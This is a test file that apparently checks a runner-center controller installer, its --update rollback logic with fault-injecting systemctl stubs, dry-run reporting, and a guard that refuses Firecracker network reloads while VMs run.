    expect(rerun.stderr).toContain("ERAINFRA_MACHINE_TOKEN_FILE and RC_MACHINE_TOKEN_FILE in");
    expect(rerun.stderr).toContain("are both set, to different values");
    expect(rerun.stderr).not.toContain("elsewhere");
    expect(readFileSync(token, "utf8")).toBe(before);
  });

  it("installs a dedicated host with --controller-token-file even where a Worker env exists", () => {
    const { sandbox, secrets } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    const result = ctlRun(
      sandbox,
      installArgs(secrets, ["--worker-env-file", workerEnv]),
      AS_WORKER,
    );
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(result.stderr).toContain("Ignored --worker-env-file");
    expect(result.stdout).not.toContain("standby");

    const env = readFileSync(envPath(sandbox), "utf8");
    expect(env).toContain(`RC_CONTROLLER_TOKEN_FILE=${SECRETS_DIR}/controller-token\n`);
    expect(env).toMatch(/^RC_EXECUTOR=firecracker$/m);
    expect(env).not.toContain("RC_MACHINE_TOKEN_FILE");
    expect(env).not.toContain("standby");
    expect(secretsWritten(sandbox)).toEqual(["controller-token", "github-app.pem"]);

    // A rerun of the kept dedicated env file leaves the Worker's token off the host.
    const rerun = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(rerun.status, `${rerun.stdout}\n${rerun.stderr}`).toBe(0);
    expect(rerun.stdout).not.toContain("Refreshed");
    expect(secretsWritten(sandbox)).toEqual(["controller-token", "github-app.pem"]);
  });

  it("selects standby or dedicated mode again when --reconfigure replaces the env file", () => {
    const { sandbox, secrets } = readyToInstall();
    const workerEnv = workerHost(sandbox);
    const installed = ctlRun(sandbox, ["--profile", PROFILE], AS_WORKER);
    expect(installed.status, `${installed.stdout}\n${installed.stderr}`).toBe(0);
    const standbyEnv = readFileSync(envPath(sandbox), "utf8");

    // The controller token takes precedence without even reading a malformed Worker credential.
    writeWorkerEnv(workerEnv, "malformed");
    const dedicated = ctlRun(sandbox, installArgs(secrets, ["--reconfigure"]), AS_WORKER);
    expect(dedicated.status, `${dedicated.stdout}\n${dedicated.stderr}`).toBe(0);
    expect(readFileSync(envPath(sandbox), "utf8")).toContain(
      `RC_CONTROLLER_TOKEN_FILE=${SECRETS_DIR}/controller-token\n`,
    );
    expect(readFileSync(envPath(sandbox), "utf8")).not.toContain("RC_MACHINE_TOKEN_FILE");

    writeWorkerEnv(workerEnv, WORKER_TOKEN);
    const standby = ctlRun(sandbox, ["--profile", PROFILE, "--reconfigure"], AS_WORKER);
    expect(standby.status, `${standby.stdout}\n${standby.stderr}`).toBe(0);
    expect(readFileSync(envPath(sandbox), "utf8")).toBe(standbyEnv);
  });

  it("needs only --profile when it finds a Worker credential", () => {
    const { sandbox } = readyToInstall();
    workerHost(sandbox);
    const result = ctlRun(sandbox, [], AS_WORKER);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("Missing: --profile\n");
    expectNothingWritten(sandbox);
  });

  function installedForUpdate(oldVersion = "1.3.0") {
    const { sandbox } = readyToInstall();
    mkdirSync(path.dirname(binaryPath(sandbox)), { recursive: true });
    writeExecutable(binaryPath(sandbox), fakeController(oldVersion));
    writeFileSync(
      under(sandbox, "/etc/systemd/system/runner-center-controller@.service"),
      OLD_UNIT,
    );
    // Two running Profiles. A retired one is installed but stopped, so it is not listed active.
    writeFileSync(
      path.join(sandbox.root, "active-units"),
      "runner-center-controller@rc-linux-js.service\nrunner-center-controller@rc-e2e.service\n",
    );
    return sandbox;
  }

  it("--update keeps the old binary and restarts only the instances that were running", () => {
    const sandbox = installedForUpdate();
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.4.2"));
    expect(readFileSync(`${binaryPath(sandbox)}.bak-1.3.0`, "utf8")).toBe(fakeController("1.3.0"));

    const service = serviceLog(sandbox);
    const restarts = service.filter((line) => line.startsWith("restart "));
    expect(restarts).toEqual([
      "restart runner-center-controller@rc-linux-js.service",
      "restart runner-center-controller@rc-e2e.service",
    ]);
    // No start, restart or enable ever names a pattern, which would revive a stopped instance.
    expect(
      service.filter((line) => /^(start|restart|enable)\b/.test(line) && line.includes("*")),
    ).toEqual([]);
    expect(service.indexOf("daemon-reload")).toBeLessThan(service.indexOf(restarts[0] ?? ""));
  });

  const ACTIVE_UNITS = [
    "runner-center-controller@rc-linux-js.service",
    "runner-center-controller@rc-e2e.service",
  ];
  const OLD_UNIT = "# previous controller unit\n[Service]\nRestartSec=17s\n";

  // Fail only on the replacement build unless `always` is requested. Log which files each
  // restart sees so a passing test proves recovery restores both files before starting anything.
  function updateFaults(
    sandbox: Sandbox,
    fields: {
      restart?: "first" | "later" | "always";
      reload?: "update" | "always";
      health?: "update" | "always";
      list?: boolean;
    },
  ) {
    const newBuild =
      '[[ "$(<"$RC_TEST_SUDO_ROOT/usr/local/lib/runner-center/runner-center-controller")" == *"1.4.2"* ]]';
    const gate = (when: "update" | "always") => (when === "always" ? "true" : newBuild);
    let faults = "";
    if (fields.list) faults += '  list-units) echo "cannot enumerate units" >&2; exit 19 ;;\n';
    if (fields.reload) {
      faults += `  daemon-reload) if ${gate(fields.reload)}; then echo "reload rejected" >&2; exit 14; fi ;;\n`;
    }
    if (fields.restart) {
      const unit = fields.restart === "later" ? ACTIVE_UNITS[1] : ACTIVE_UNITS[0];
      const condition =
        fields.restart === "always" ? "true" : `${newBuild} && [ "$2" = "${unit}" ]`;
      faults += `  restart) if ${condition}; then echo "restart rejected for $2" >&2; exit 17; fi ;;\n`;
    }
    if (fields.health) {
      // Keep the first instance healthy, so this is a failure discovered late in the pass.
      faults += `  is-active) if ${gate(fields.health)} && [ "$3" = "${ACTIVE_UNITS[1]}" ]; then echo "late health failure" >&2; exit 3; fi ;;\n`;
    }
    const snapshots = `
if [ "$1" = restart ]; then
  build=old
  if ${newBuild}; then build=new; fi
  unit=restored
  if [ ! -f "$RC_TEST_SUDO_ROOT/etc/systemd/system/runner-center-controller@.service" ]; then
    unit=missing
  elif [[ "$(<"$RC_TEST_SUDO_ROOT/etc/systemd/system/runner-center-controller@.service")" != *"previous controller unit"* ]]; then
    unit=new
  fi
  printf 'files %s %s %s\n' "$2" "$build" "$unit" >> "$RC_TEST_SERVICE_LOG"
fi
`;
    writeExecutable(
      path.join(sandbox.root, "bin", "systemctl"),
      CONTROLLER_SYSTEMCTL_STUB.replace('case "$1" in', `${snapshots}\ncase "$1" in\n${faults}`),
    );
  }

  function expectRestored(sandbox: Sandbox) {
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.3.0"));
    expect(
      readFileSync(under(sandbox, "/etc/systemd/system/runner-center-controller@.service"), "utf8"),
    ).toBe(OLD_UNIT);
    const log = serviceLog(sandbox);
    // The only lifecycle operations are restarts of the saved active instances, never a glob or
    // a stopped/retired instance. Check this in failure paths too, not just on a good update.
    for (const line of log.filter((entry) => /^(start|restart|enable)\b/.test(entry))) {
      expect(ACTIVE_UNITS.map((unit) => `restart ${unit}`)).toContain(line);
    }
  }

  it.each(["first", "later"] as const)(
    "--update restores both files when the %s instance's restart fails immediately",
    (restart) => {
      const sandbox = installedForUpdate();
      updateFaults(sandbox, { restart });
      const result = ctlRun(sandbox, ["--update"]);
      expect(result.status, result.stdout + result.stderr).toBe(1);
      expectRestored(sandbox);
      expect(result.stderr).toContain(
        `restart ${ACTIVE_UNITS[restart === "first" ? 0 : 1]} failed (exit 17)`,
      );
      expect(result.stderr).toContain("Rolled back to 1.3.0");
      expect(result.stderr).not.toContain("Rollback recovery failed");
      const snapshots = serviceLog(sandbox).filter((line) => line.startsWith("files "));
      expect(snapshots.slice(-2)).toEqual(ACTIVE_UNITS.map((unit) => `files ${unit} old restored`));
    },
  );

  it("--update rolls back a failed daemon-reload before restarting either instance", () => {
    const sandbox = installedForUpdate();
    updateFaults(sandbox, { reload: "update" });
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status).toBe(1);
    expectRestored(sandbox);
    expect(result.stderr).toContain("daemon-reload failed (exit 14)");
    expect(result.stderr).not.toContain("Rollback recovery failed");
    expect(serviceLog(sandbox).filter((line) => line.startsWith("files "))).toEqual(
      ACTIVE_UNITS.map((unit) => `files ${unit} old restored`),
    );
  });

  it("--update restores a failed late health check, then checks the restored instances too", () => {
    const sandbox = installedForUpdate();
    updateFaults(sandbox, { health: "update" });
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status).toBe(1);
    expectRestored(sandbox);
    expect(result.stderr).toContain(`health check ${ACTIVE_UNITS[1]} failed (exit 3)`);
    expect(result.stderr).not.toContain("Rollback recovery failed");
    expect(
      serviceLog(sandbox)
        .filter((line) => line.startsWith("files "))
        .slice(-2),
    ).toEqual(ACTIVE_UNITS.map((unit) => `files ${unit} old restored`));
    expect(serviceLog(sandbox).filter((line) => line.startsWith("is-active "))).toHaveLength(4);
  });

  /**
   * The host a dry run reads: the controller account exists, `systemctl show` answers from
   * `unit-files` (one `<unit> <FragmentPath> [<drop-in>]` per line), and each listed Profile has
   * its env file.
   */
  function dryRunHost(sandbox: Sandbox, units: string[], envFor: string[]) {
    writeExecutable(
      path.join(sandbox.root, "bin", "getent"),
      '#!/usr/bin/env bash\n[ "$2" = runner-center-controller ] && { echo "runner-center-controller:x:998:998::/nonexistent:/usr/sbin/nologin"; exit 0; }\nexit 2\n',
    );
    writeFileSync(path.join(sandbox.root, "unit-files"), units.map((u) => `${u}\n`).join(""));
    const show = `  show)
    unit=""; prop=""
    for arg in "$@"; do case "$arg" in FragmentPath|DropInPaths) prop=$arg ;; runner-center-controller@*) unit=$arg ;; esac; done
    while read -r name fragment dropin; do
      [ "$name" = "$unit" ] || continue
      if [ "$prop" = FragmentPath ]; then printf '%s\\n' "$fragment"; else printf '%s\\n' "$dropin"; fi
    done < "$RC_TEST_UNIT_FILES"
    ;;
`;
    writeExecutable(
      path.join(sandbox.root, "bin", "systemctl"),
      CONTROLLER_SYSTEMCTL_STUB.replace('case "$1" in\n', `case "$1" in\n${show}`),
    );
    for (const profile of envFor) {
      const env = under(sandbox, `/etc/runner-center/profiles/${profile}.env`);
      mkdirSync(path.dirname(env), { recursive: true });
      writeFileSync(env, `RC_PROFILE=${profile}\n`);
    }
  }
  const TEMPLATE = "/etc/systemd/system/runner-center-controller@.service";
  const dryRun = (sandbox: Sandbox) =>
    ctlRun(sandbox, ["--update", "--dry-run"], {
      RC_TEST_UNIT_FILES: path.join(sandbox.root, "unit-files"),
    });
  function expectUntouched(sandbox: Sandbox) {
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.3.0"));
    expect(existsSync(`${binaryPath(sandbox)}.bak-1.3.0`)).toBe(false);
    expect(readFileSync(under(sandbox, TEMPLATE), "utf8")).toBe(OLD_UNIT);
    expect(
      serviceLog(sandbox).filter((line) =>
        /^(start|restart|enable|stop|daemon-reload)\b/.test(line),
      ),
    ).toEqual([]);
  }

  it("--update --dry-run names the instances --update would restart and changes nothing", () => {
    const sandbox = installedForUpdate();
    dryRunHost(
      sandbox,
      ACTIVE_UNITS.map((unit) => `${unit} ${TEMPLATE}`),
      ["rc-linux-js", "rc-e2e"],
    );
    const result = dryRun(sandbox);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    for (const unit of ACTIVE_UNITS)
      expect(result.stdout).toContain(`--update would restart ${unit}.`);
    expect(result.stdout).toContain("Dry run passed.");
    expectUntouched(sandbox);
  });

  it("--update --dry-run fails on an instance --update would not reach or could not start", () => {
    const sandbox = installedForUpdate();
    dryRunHost(
      sandbox,
      [
        // A hand-written unit file for one Profile shadows the template --update replaces.
        `${ACTIVE_UNITS[0]} /etc/systemd/system/${ACTIVE_UNITS[0]}`,
        `${ACTIVE_UNITS[1]} ${TEMPLATE}`,
      ],
      [], // and no env file where the release unit reads it
    );
    const result = dryRun(sandbox);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain(
      `${ACTIVE_UNITS[0]} runs from /etc/systemd/system/${ACTIVE_UNITS[0]}, not ${TEMPLATE}`,
    );
    expect(result.stderr).toContain(
      `${ACTIVE_UNITS[1]} has no /etc/runner-center/profiles/rc-e2e.env`,
    );
    expect(result.stderr).toContain("Dry run found 2 problem(s)");
    expectUntouched(sandbox);
  });

  it("--update --dry-run fails when no controller instance is running", () => {
    const sandbox = installedForUpdate();
    dryRunHost(sandbox, [], []);
    rmSync(path.join(sandbox.root, "active-units"));
    const result = dryRun(sandbox);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("so --update would restart nothing");
    expectUntouched(sandbox);
  });

  it("refuses --dry-run without --update", () => {
    const { sandbox } = readyToInstall();
    const result = ctlRun(sandbox, ["--profile", PROFILE, "--dry-run"]);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("--dry-run goes with --update");
  });

  it.each([
    ["reload", "rollback daemon-reload failed (exit 14)"],
    ["restart", `rollback restart ${ACTIVE_UNITS[0]} failed (exit 17)`],
    ["health", `rollback health check ${ACTIVE_UNITS[1]} failed (exit 3)`],
  ] as const)(
    "--update reports the original failure and a persistent rollback %s failure",
    (kind, error) => {
      const sandbox = installedForUpdate();
      updateFaults(sandbox, { [kind]: "always" });
      const result = ctlRun(sandbox, ["--update"]);
      expect(result.status).toBe(1);
      expectRestored(sandbox);
      expect(result.stderr).toContain("Update to 1.4.2 failed:");
      expect(result.stderr).toContain("Rollback recovery failed:");
      expect(result.stderr).toContain(error);
      expect(result.stderr).toContain("Manual recovery required");
      // Recovery tries the second saved instance even when restarting the first one fails.
      expect(
        serviceLog(sandbox)
          .filter((line) => line.startsWith("files "))
          .slice(-2),
      ).toEqual(ACTIVE_UNITS.map((unit) => `files ${unit} old restored`));
    },
  );

  it("--update makes no changes when the active instances cannot be enumerated", () => {
    const sandbox = installedForUpdate();
    updateFaults(sandbox, { list: true });
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status).toBe(1);
    expectRestored(sandbox);
    expect(result.stderr).toContain("Could not list active controllers");
    expect(serviceLog(sandbox).filter((line) => line.startsWith("restart "))).toEqual([]);
  });

  it("--update removes the new unit on rollback when no unit existed before", () => {
    const sandbox = installedForUpdate();
    const unit = under(sandbox, "/etc/systemd/system/runner-center-controller@.service");
    rmSync(unit);
    updateFaults(sandbox, { reload: "update" });
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status).toBe(1);
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.3.0"));
    expect(existsSync(unit)).toBe(false);
  });

  it.each(["binary", "unit"] as const)(
    "--update rolls back when staging the replacement %s fails",
    (file) => {
      const sandbox = installedForUpdate();
      const source =
        file === "binary"
          ? "*/runner-center-controller-linux-x86_64"
          : "*/runner-center-controller@.service";
      writeExecutable(
        path.join(sandbox.root, "bin", "install"),
        `#!/usr/bin/env bash
case "$3" in
  ${source}) echo "replacement install rejected" >&2; exit 23 ;;
esac
exec /usr/bin/install "$@"
`,
      );
      // A failed install must not fall through to mv and publish a leftover staging file.
      writeExecutable(`${binaryPath(sandbox)}.new`, "# incomplete staging file\n");
      const result = ctlRun(sandbox, ["--update"]);
      expect(result.status).toBe(1);
      expectRestored(sandbox);
      expect(result.stderr).toContain(`install controller ${file} failed (exit 23)`);
      expect(result.stderr).not.toContain("Rollback recovery failed");
    },
  );

  it.each(["binary", "unit"] as const)(
    "--update reports a rollback %s restore failure and does not restart rejected files",
    (file) => {
      const sandbox = installedForUpdate();
      updateFaults(sandbox, { reload: "update" });
      if (file === "binary") {
        writeExecutable(
          path.join(sandbox.root, "bin", "install"),
          `#!/usr/bin/env bash
case "$3" in *.bak-1.3.0) echo "backup read failed" >&2; exit 28 ;; esac
exec /usr/bin/install "$@"
`,
        );
      } else {
        writeExecutable(
          path.join(sandbox.root, "bin", "cp"),
          `#!/usr/bin/env bash
case "$2" in *.service.bak-1.3.0) echo "unit restore failed" >&2; exit 29 ;; esac
exec /bin/cp "$@"
`,
        );
      }
      const result = ctlRun(sandbox, ["--update"]);
      expect(result.status).toBe(1);
      expect(result.stderr).toContain("Update to 1.4.2 failed: daemon-reload failed (exit 14)");
      expect(result.stderr).toContain(
        `restore controller ${file} failed (exit ${file === "binary" ? 28 : 29})`,
      );
      expect(result.stderr).toContain("Rollback recovery failed:");
      expect(result.stderr).toContain("skipped controller restarts");
      expect(result.stderr).toContain("Manual recovery required");
      expect(result.stderr).not.toContain("Rolled back to");
      expect(serviceLog(sandbox).filter((line) => line.startsWith("restart "))).toEqual([]);
      expect(readFileSync(`${binaryPath(sandbox)}.bak-1.3.0`, "utf8")).toBe(
        fakeController("1.3.0"),
      );
      expect(
        readFileSync(
          under(sandbox, "/etc/systemd/system/runner-center-controller@.service.bak-1.3.0"),
          "utf8",
        ),
      ).toBe(OLD_UNIT);
      expect(result.stderr).toContain(
        "unit backup: /etc/systemd/system/runner-center-controller@.service.bak-1.3.0",
      );
      // Recovery still attempts the other file even when restoring one fails.
      if (file === "binary") {
        expect(
          readFileSync(
            under(sandbox, "/etc/systemd/system/runner-center-controller@.service"),
            "utf8",
          ),
        ).toBe(OLD_UNIT);
      } else {
        expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.3.0"));
      }
    },
  );

  it("--update restores unit permissions as well as its contents", () => {
    const sandbox = installedForUpdate();
    const unit = under(sandbox, "/etc/systemd/system/runner-center-controller@.service");
    chmodSync(unit, 0o600);
    updateFaults(sandbox, { restart: "first" });
    expect(ctlRun(sandbox, ["--update"]).status).toBe(1);
    expectRestored(sandbox);
    expect(statSync(unit).mode & 0o777).toBe(0o600);
  });

  it("--update with no active instances still rolls back a reload failure without starting anything", () => {
    const sandbox = installedForUpdate();
    writeFileSync(path.join(sandbox.root, "active-units"), "");
    updateFaults(sandbox, { reload: "update" });
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status).toBe(1);
    expectRestored(sandbox);
    expect(serviceLog(sandbox).filter((line) => /^(start|restart|enable)\b/.test(line))).toEqual(
      [],
    );
  });

  it("--update rolls back when systemctl restart itself fails", () => {
    const sandbox = installedForUpdate();
    writeExecutable(
      path.join(sandbox.root, "bin", "systemctl"),
      CONTROLLER_SYSTEMCTL_STUB.replace("  is-active)", "  restart) exit 1 ;;\n  is-active)"),
    );
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status).toBe(1);
    expect(readFileSync(binaryPath(sandbox), "utf8"), result.stdout + result.stderr).toBe(
      fakeController("1.3.0"),
    );
    expect(result.stderr).toContain("Rolled back");
  });

  it("--update rolls back when an instance does not come back", () => {
    const sandbox = installedForUpdate();
    writeFileSync(
      path.join(sandbox.root, "failing-units"),
      "runner-center-controller@rc-e2e.service\n",
    );
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("Rolled back to 1.3.0");
    expect(result.stdout + result.stderr).toContain(
      "journal for runner-center-controller@rc-e2e.service",
    );
    expect(readFileSync(binaryPath(sandbox), "utf8")).toBe(fakeController("1.3.0"));
    // Both instances restarted onto the new binary, then both again onto the restored one.
    expect(serviceLog(sandbox).filter((line) => line.startsWith("restart "))).toHaveLength(4);
  });

  it("--update with the pinned binary already installed changes nothing", () => {
    const sandbox = installedForUpdate("1.4.2");
    const result = ctlRun(sandbox, ["--update"]);
    expect(result.status, `${result.stdout}\n${result.stderr}`).toBe(0);
    expect(result.stdout).toContain("nothing changed");
    expect(existsSync(`${binaryPath(sandbox)}.bak-1.4.2`)).toBe(false);
    expect(readLog(path.join(sandbox.root, "service.log"))).toBe("");
  });

  it("--update refuses Profile settings, which belong to --reconfigure", () => {
    const sandbox = installedForUpdate();
    const result = ctlRun(sandbox, ["--update", "--profile", PROFILE]);
    expect(result.status).toBe(1);
    expect(result.stderr).toContain("--reconfigure");
  });

  // A Worker host can also run a controller, so the Firecracker host's uninstall must take only its
  // own files out of the shared lib directory.
  it("leaves the controller binary behind when the Firecracker host is uninstalled", () => {
    const provisioner = repoFile("deploy", "provision-firecracker-host.sh").toString("utf8");
    const start = provisioner.indexOf("uninstall() {");
    const uninstall = provisioner.slice(start, provisioner.indexOf("\n}\n", start));
    expect(uninstall).not.toMatch(/rm -rf[^\n]*"\$RC_LIB_DIR"/);
    expect(uninstall).toContain(
      'rm -f "$RC_LIB_DIR/runner-center-runtime" "$RC_LIB_DIR/thinpool-setup.sh"',
    );
  });

  // Loading the table file starts with `delete table`, which strips every running guest's
  // per-guest sets, so the provisioner refuses while Firecracker VMs run and says how to drain.
  describe("the Firecracker provisioner with guests running", () => {
    const provisioner = repoFile("deploy", "provision-firecracker-host.sh").toString("utf8");
    const start = provisioner.indexOf("refuse_reload_under_running_guests() {");
    const guard = provisioner.slice(start, provisioner.indexOf("\n}\n", start) + 3);

    function runGuard(pids: string[], force: boolean) {
      const bin = mkdtempSync(path.join(tmpdir(), "rc-fc-guard-"));
      sandboxes.push(bin);
      // pgrep exits 1 when nothing matches, as the real one does.
      writeFileSync(
        path.join(bin, "pgrep"),
        `#!/bin/sh\n[ "$1 $2" = "-x firecracker" ] || exit 2\n${
          pids.length > 0 ? `printf '%s\\n' ${pids.join(" ")}` : "exit 1"
        }\n`,
      );
      chmodSync(path.join(bin, "pgrep"), 0o755);
      const script = [
        "set -euo pipefail",
        "fail() { printf 'error: %s\\n' \"$1\" >&2; exit 1; }",
        "note() { printf '    %s\\n' \"$1\"; }",
        "RUNTIME_UNIT=runner-center-runtime.service",
        `FORCE_NETWORK_RELOAD=${force ? 1 : 0}`,
        guard,
        "refuse_reload_under_running_guests",
        "echo reached-the-reload",
      ].join("\n");
      return spawnSync("bash", ["-c", script], {
        encoding: "utf8",
        env: { PATH: `${bin}:/usr/bin:/bin` },
      });
    }

    it("is called before the host is changed", () => {
      expect(start).toBeGreaterThan(0);
      const call = provisioner.indexOf("\nrefuse_reload_under_running_guests\n");
      expect(call).toBeGreaterThan(0);
      expect(call).toBeLessThan(provisioner.indexOf("step 'Loading kernel modules"));
      expect(call).toBeLessThan(provisioner.indexOf('nft -f "$RC_ETC_DIR/nftables.rc.conf"'));
    });

    it("refuses with running VMs and says how to drain", () => {
      const result = runGuard(["4242", "4243"], false);
      expect(result.status).toBe(1);
      expect(result.stdout).not.toContain("reached-the-reload");
      expect(result.stderr).toContain("2 Firecracker VMs are running");
      expect(result.stderr).toContain("sudo systemctl stop runner-center-runtime.service");
      expect(result.stderr).toContain("take-the-only-worker-away.md");
      expect(result.stderr).toContain("--force-network-reload");
    });

    it("goes ahead with no VMs running", () => {
      const result = runGuard([], false);
      expect(result.status, result.stderr).toBe(0);
      expect(result.stdout).toContain("reached-the-reload");
    });

    it("goes ahead when forced, and says the jobs end", () => {
      const result = runGuard(["4242"], true);
      expect(result.status, result.stderr).toBe(0);
      expect(result.stdout).toContain("1 Firecracker VMs running");
      expect(result.stdout).toContain("reached-the-reload");
    });
  });
});
